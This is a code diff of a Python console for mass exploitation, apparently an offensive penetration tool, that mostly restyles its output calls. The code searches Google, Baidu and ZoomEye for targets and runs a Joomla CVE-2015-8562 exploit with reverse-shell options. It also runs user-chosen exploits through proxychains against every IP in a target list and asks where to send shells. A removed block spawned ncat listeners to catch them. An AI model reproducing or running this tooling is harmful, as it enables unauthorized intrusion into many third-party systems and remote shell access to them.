@@ -12,6 +12,7 @@ import time
 
 import lib.tools.exploits as exploit_exec
 from lib.cli import colors, console
+from lib.cli.colors import colored_print
 from lib.tools import zoomeye, baidu
 from lib.cli.console import debug_except, input_check, check_kill_process
 
@@ -70,12 +71,13 @@ def execute(cmd):
     handles user input in console
     '''
 
+    # lol i don't want any errors here
     cmd = str(cmd).lower().strip()
+
     if cmd == '':
         return
     elif cmd == 'info':
-        print(
-            colors.CYAN +
+        colored_print(
             '[*] Current directory: {}\
             \n[*] Init directory: {}\
             \n[*] Target: {}\
@@ -83,29 +85,32 @@ def execute(cmd):
                 os.getcwd(),
                 SESSION.init_dir,
                 SESSION.ip_list,
-                SESSION.proxy_conf) +
-            colors.END)
+                SESSION.proxy_conf),
+            colors.CYAN)
+
     elif cmd.startswith('target'):
         target = ''.join(cmd.split()[1:])
-        if not target in os.listdir(SESSION.init_dir + '/data'):
+        if target not in os.listdir(SESSION.init_dir + '/data'):
             return
-        print(colors.BLUE + '[i] Target changed to {}'.format(target))
+        colored_print('[i] Target changed to {}'.format(target), colors.BLUE)
         SESSION.ip_list = SESSION.init_dir + \
             '/data/' + target
+
     elif cmd == 'init' or cmd == 'i':
-        print(colors.CYAN +
-              '[*] Going back to init_dir...' + colors.END)
+        colored_print('[*] Going back to init_dir...', colors.BLUE)
         os.chdir(SESSION.init_dir)
+
     elif cmd.startswith('baidu'):
         try:
             command = cmd.strip().split()
             dork = command[1]
             count = int(command[2])
             os.chdir(SESSION.out_dir)
-            print(colors.PURPLE + '[*] Searching on Baidu...' + colors.END)
+            colored_print('[*] Searching on Baidu...', colors.PURPLE)
             baidu.spider(dork, count)
         except (IndexError, EOFError, KeyboardInterrupt, SystemExit):
             return
+
     elif cmd == 'proxy':
         if not os.path.exists(SESSION.ss_config):
             console.print_error(
@@ -120,27 +125,35 @@ def execute(cmd):
             console.print_error(
                 '[-] Error starting Shadowsocks proxy: ' + str(err))
             debug_except()
+
     elif cmd == 'redis':
         console.print_error('[-] Under development')
+
     elif cmd.startswith('google'):
         try:
             cmd = cmd.strip().split()
             dork = cmd[1]
             # well yes im a lazy guy
             subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
-                             '--dork', dork, '--revshell=\'127.0.0.1\'', '--port=4444'])
+                             '--dork', dork,
+                             '--revshell=\'127.0.0.1\'',
+                             '--port=4444'])
         except BaseException as err:
             console.print_error(str(err))
             debug_except()
+
     elif cmd == 'q' or cmd == 'quit':
         check_kill_process('ss-proxy')
         sys.exit(0)
+
     elif cmd == 'h' or cmd == 'help' or cmd == '?':
         print(console.HELP_INFO)
+
     elif cmd == 'exploits':
-        print(colors.CYAN + '[+] Available exploits: ' + colors.END)
+        colored_print('[+] Available exploits: ', colors.CYAN)
         for poc in list_exp():
-            print(colors.BLUE + poc + colors.END)
+            colored_print(poc, colors.BLUE)
+
     elif cmd == 'z' or cmd == "zoomeye":
         try:
             zoomeye.run()
@@ -148,12 +161,16 @@ def execute(cmd):
             pass
         else:
             debug_except()
+
     elif cmd == 'x' or cmd == 'clear':
         os.system("clear")
+
     elif cmd == 'c' or cmd == 'reset':
         os.system("reset")
+
     elif cmd == "attack" or cmd == "e":
         attack()
+
     else:
         try:
             print(
@@ -175,7 +192,8 @@ def attack():
     handles attack command
     '''
     SESSION.use_proxy = input_check(
-        '[?] Do you wish to use proxychains? [y/n] ', choices=['y', 'n']) == 'y'
+        '[?] Do you wish to use proxychains? [y/n] ',
+        choices=['y', 'n']) == 'y'
     answ = input_check(
         '\n[?] Do you wish to use\
         \n\n    [a] built-in exploits\
@@ -198,6 +216,7 @@ def attack():
                      '2',
                      '3',
                      '4'])
+
         try:
             if answ == '2':
                 console.print_error("\n[-] Under development")
@@ -209,6 +228,7 @@ def attack():
                 scanner(exploit_exec.s2_045())
             elif answ == '4':
                 scanner(exploit_exec.witbe())
+
         except (EOFError, KeyboardInterrupt, SystemExit):
             return
 
@@ -219,13 +239,18 @@ def attack():
             colors.BOLD +
             "\nWelcome, in here you can choose your own exploit\n" +
             colors.END)
-        print(colors.CYAN + '[*] Here are available exploits:\n' + colors.END)
+        colored_print('[*] Here are available exploits:\n', colors.CYAN)
+
         for poc in list_exp():
-            print(colors.BLUE + poc + colors.END)
+            colored_print(poc + colors.END, colors.BLUE)
+
         exploit = input_check(
-            "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ", choices=list_exp())
+            "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ",
+            choices=list_exp())
+
         jobs = int(
             input_check("[?] How many processes each time? ", check_type=int))
+
         custom_args = []
         answ = input_check(
             "[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])
@@ -233,56 +258,39 @@ def attack():
             lhost = input(
                 "[*] Where do you want me to send shells? ").strip()
             lport = input_check(
-                "[*] and at what port? (make sure you have access to that port) ",
+                "[*] and at what port?",
                 check_type=int)
             custom_args = ['-l', lhost, '-p', lport]
-            answ = input_check(
-                '[*] Do you need me to start a listener? [y/n] ', choices=['y', 'n'])
-            if answ == 'y':
-                print("\n[*] Spawning ncat listener in new window...\n")
-                try:
-                    subprocess.Popen(
-                        args=[
-                            "gnome-terminal",
-                            "--command=ncat -nklvp " +
-                            lport +
-                            " -m 1000"],
-                        shell=False,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE)
-                except BaseException:
-                    print(
-                        colors.YELLOW +
-                        "[-] Could not launch our listener, do you have GNOME-Terminal installed?" +
-                        colors.END +
-                        '\n')
-            else:
-                print(
-                    "[*] Okay, just make sure you receive the reverse shells\n")
         else:
             pass
+
         custom_args += input(
-            "[*] args for this exploit (target IP is handled already) ").strip().split()
+            "[*] args for this exploit").strip().split()
+
+        # parse user's exploit name
         exec_path = exploit.split('/')[1:]
         work_path = exploit.split('/')[:-1]
-        delimtr = '/'
-        exec_path = delimtr.join(exec_path)
-        work_path = delimtr.join(work_path)
-        delimtr = ' '
+        exec_path = '/'.join(exec_path)
+        work_path = '/'.join(work_path)
+
+        # let user check if there's anything wrong
         print(
             colors.BLUE +
             '[*] Your exploit will be executed like\n' +
             colors.END,
             'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                 exec_path),
-            delimtr.join(custom_args))
+            ' '.join(custom_args))
+
+        # args as parameter for scanner
         scanner_args = (
-            exploit,
             work_path,
             exec_path,
             custom_args,
             jobs)
+        # start scanner
         scanner(scanner_args)
+
     else:
         console.print_error('[-] Invalid input')
 
@@ -293,8 +301,9 @@ def scanner(scanner_args):
     '''
 
     # looks ugly, but since it works well, im not planning a rewrite
-    _, work_path, exec_path, custom_args, jobs = scanner_args[0], \
-        scanner_args[1], scanner_args[2], scanner_args[3], scanner_args[4]
+    work_path, exec_path, custom_args, jobs = scanner_args[
+        0], scanner_args[1], scanner_args[2], scanner_args[3]
+
     if SESSION.use_proxy:
         e_args = [
             'proxychains4',
@@ -304,26 +313,39 @@ def scanner(scanner_args):
             './' + exec_path]
     else:
         e_args = ['./' + exec_path]
+
+    # add custom arguments for different exploits
     e_args += custom_args
+    # the last argument is target host
     e_args += ['-t']
+
     try:
         target_list = open(SESSION.ip_list)
     except BaseException as exc:
         console.print_error('[-] Error occured: {}\n'.format(exc))
         debug_except()
         return
+
     os.chdir('./exploits/' + work_path)
     console.print_warning(
         '\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())
+
+    # you might want to cancel the scan to correct some errors
     if input_check('[?] Proceed? [y/n] ', choices=['y', 'n']) == 'n':
         return
+
     console.print_warning('\n[!] It might be messy, get ready!' + '\n')
     time.sleep(2)
+
+    # needed for the loop
     count = 0
     tested = count
     rnd = 1
+
     for line in target_list:
         target_ip = line.strip()
+
+        # display progress info on top
         progress = colors.BLUE + colors.BOLD + 'ROUND.' + \
             str(rnd) + colors.END + '  ' + colors.CYAN + colors.BOLD + \
             str(tested + 1) + colors.END + ' targets found\n'
@@ -332,9 +354,13 @@ def scanner(scanner_args):
             sys.stdout.flush()
         except KeyboardInterrupt:
             exit()
+
+        # mark this loop as done
         count += 1
         tested += 1
+
         try:
+            # start and display current process
             e_args += [target_ip]
             print(colors.CYAN + ' '.join(e_args) + colors.END + '\n')
             proc = subprocess.Popen(e_args)
@@ -343,15 +369,20 @@ def scanner(scanner_args):
             e_args.remove(target_ip)
             time.sleep(.1)
 
+            # process pool
             if count == jobs or count == 0:
                 count = 0
                 rnd += 1
                 _, _ = proc.communicate()
+                # if returned any exit code, consider the process as done
                 if proc.returncode is not None:
                     proc.kill()
                 continue
+
+            # clear screen for next loop
             sys.stdout.flush()
             os.system('clear')
+
         except (EOFError, KeyboardInterrupt, SystemExit):
             sys.exit(1)
 
@@ -363,7 +394,7 @@ def scanner(scanner_args):
 
 def main():
     '''
-    manage procedure
+    handles user interface
     '''
 
     answ = str(
@@ -377,6 +408,7 @@ def main():
             input_check(
                 '[=] Choose your target IP list, eg. ip_list.txt ',
                 choices=os.listdir('data'))
+
     while True:
         try:
             cmd = input(
@@ -389,17 +421,21 @@ def main():
                 colors.BOLD +
                 " > " +
                 colors.END)
+
             try:
                 execute(cmd)
             except (KeyboardInterrupt, EOFError, SystemExit):
                 sys.exit(0)
+
         except KeyboardInterrupt:
+
             try:
                 answ = input("\n[?] Are you sure to exit? [y/n] ")
             except KeyboardInterrupt:
                 print("\n[-] Okay okay, exiting immediately...")
                 check_kill_process('ss-proxy')
                 sys.exit(0)
+
             if answ.lower() == 'y':
                 check_kill_process('ss-proxy')
                 sys.exit(0)
